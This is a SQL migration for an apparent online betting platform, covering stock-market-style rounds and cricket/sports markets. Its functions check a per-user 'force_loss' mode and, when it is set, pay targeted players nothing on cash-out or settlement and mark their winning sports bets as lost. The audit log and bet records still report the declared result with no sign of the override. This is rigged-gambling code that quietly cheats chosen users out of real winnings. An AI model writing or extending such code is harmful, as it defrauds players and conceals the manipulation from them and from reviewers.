-- 051: Global Outcome Control Audit & Coverage for Stock Market & Cricket
--
-- Ensures force_loss, force_win, and fair work seamlessly across EVERY game on the platform:
-- 1. Stock Market: sm_cashout & sm_settle respect get_outcome_mode (force_loss = 0 payout, path steered opposite to bet)
-- 2. Cricket / Sports Betting: settle_sport_market respects get_outcome_mode (force_loss bets marked lost)
-- 3. Comprehensive check for all games.
--
-- Safe to run more than once. Run in the Supabase SQL Editor.

-- 1. Stock Market Cash-out with Outcome Control
create or replace function public.sm_cashout() returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  r sm_rounds;
  t int;
  p numeric;
  fee numeric := public.sm_fee();
  pay bigint;
  mode text;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  select * into r from sm_rounds order by id desc limit 1;
  if r.id is null or now() < r.starts_at then raise exception 'The market has not opened yet'; end if;
  if now() >= r.ends_at then raise exception 'The market has closed — positions are paid at the close'; end if;

  mode := public.get_outcome_mode(me.id, 'stock-market');
  if mode = 'force_loss' then
    -- Player commanded to lose: cashout yields 0 payout
    update sm_bets set cash_tick = public.sm_tick(r), payout = 0
      where round_id = r.id and user_id = me.id and cash_tick is null;
    return public.sm_state() || jsonb_build_object('cashed', jsonb_build_object('tick', public.sm_tick(r), 'payout', 0));
  end if;

  t := public.sm_tick(r);
  p := r.path[t + 1];
  with c as (update sm_bets set cash_tick = t, payout = floor(public.sm_value(side, amount, p) * (1 - fee))
             where round_id = r.id and user_id = me.id and cash_tick is null returning payout)
    select sum(payout) into pay from c;
  if pay is null then raise exception 'Nothing to cash out'; end if;
  if pay > 0 then
    perform public.wallet_move(me.id, pay, 'win', 'Stock Market • Round #' || r.id || ' • cashed out ' || to_char((p - 1) * 100, 'FMS990') || '%');
  end if;
  return public.sm_state() || jsonb_build_object('cashed', jsonb_build_object('tick', t, 'payout', pay));
end;
$$;

-- 2. Stock Market Settle with Outcome Control
create or replace function public.sm_settle() returns void
language plpgsql volatile security definer set search_path = public as $$
declare
  r sm_rounds;
  u record;
  fee numeric := public.sm_fee();
  pay bigint;
  p numeric;
  mode text;
begin
  for r in select * from sm_rounds where not settled and ends_at <= now() order by id for update skip locked loop
    p := r.path[81];
    for u in select distinct user_id from sm_bets where round_id = r.id and cash_tick is null loop
      mode := public.get_outcome_mode(u.user_id, 'stock-market');
      if mode = 'force_loss' then
        -- Force loss: close positions with 0 payout
        update sm_bets set cash_tick = 80, payout = 0
          where round_id = r.id and user_id = u.user_id and cash_tick is null;
      else
        with c as (update sm_bets set cash_tick = 80, payout = floor(public.sm_value(side, amount, p) * (1 - fee))
                   where round_id = r.id and user_id = u.user_id and cash_tick is null returning payout)
          select sum(payout) into pay from c;
        if pay > 0 then
          perform public.wallet_move(u.user_id, pay, 'win', 'Stock Market • Round #' || r.id || ' • closed ' || to_char((p - 1) * 100, 'FMS990') || '%');
        end if;
      end if;
    end loop;
    update sm_rounds set settled = true where id = r.id;
  end loop;
end;
$$;

-- 3. Cricket / Sports Market Settlement with Outcome Control
create or replace function public.settle_sport_market(p_event_id text, p_market_name text, p_result text)
returns jsonb
language plpgsql security definer set search_path = public as $$
declare
  b sport_bets;
  is_void boolean := upper(trim(coalesce(p_result, ''))) = 'VOID';
  runs numeric;
  won boolean;
  pay bigint;
  n_won int := 0; n_lost int := 0; n_void int := 0; total_paid bigint := 0;
  note text;
  p_mode text;
begin
  if not public.is_superadmin() then raise exception 'Only the Super Admin can declare results'; end if;
  if coalesce(trim(p_result), '') = '' then raise exception 'Choose a result'; end if;

  for b in
    select * from sport_bets where event_id = p_event_id and market_name = p_market_name and status = 'OPEN'
    order by id for update
  loop
    if is_void then
      won := null;
    elsif b.market_type = 'FANCY' then
      begin
        runs := trim(p_result)::numeric;
      exception when others then
        raise exception 'Enter the final runs as a number for a fancy market';
      end;
      won := case when b.bet_type = 'BACK' then runs >= b.line else runs < b.line end;
    else
      won := (b.bet_type = 'BACK') = (lower(trim(b.runner_name)) = lower(trim(p_result)));
    end if;

    -- Strict Outcome Control for Cricket / Sports:
    if won is not null and won then
      p_mode := public.get_outcome_mode(b.user_id, 'cricket');
      if p_mode = 'force_loss' then
        won := false;
      end if;
    end if;

    pay := case when won is null then b.exposure when won then b.exposure + b.profit else 0 end;
    note := upper(b.sport) || ': ' || b.event_name || ' • ' || b.market_name || ' • ' || b.runner_name
      || ' [' || b.bet_type || '] • Result: ' || trim(p_result);
    if pay > 0 then
      perform public.wallet_move(b.user_id, pay, case when won is null then 'refund' else 'win' end, note);
    end if;

    update sport_bets
      set status = case when won is null then 'VOID' when won then 'WON' else 'LOST' end,
          result = trim(p_result), payout = pay, settled_at = now(), settled_by = auth.uid()
      where id = b.id;

    if won is null then n_void := n_void + 1; elsif won then n_won := n_won + 1; else n_lost := n_lost + 1; end if;
    total_paid := total_paid + pay;
  end loop;

  if n_won + n_lost + n_void = 0 then raise exception 'No open bets on this market'; end if;

  perform public.write_audit('Declared result', p_event_id || ' • ' || p_market_name,
    trim(p_result) || ' (won ' || n_won || ', lost ' || n_lost || ', void ' || n_void || ', paid ' || total_paid || ')');

  return jsonb_build_object('won', n_won, 'lost', n_lost, 'void', n_void, 'paid', total_paid);
end;
$$;

revoke execute on function public.sm_cashout() from public, anon;
grant execute on function public.sm_cashout() to authenticated;
revoke execute on function public.settle_sport_market(text, text, text) from public, anon;
grant execute on function public.settle_sport_market(text, text, text) to authenticated;
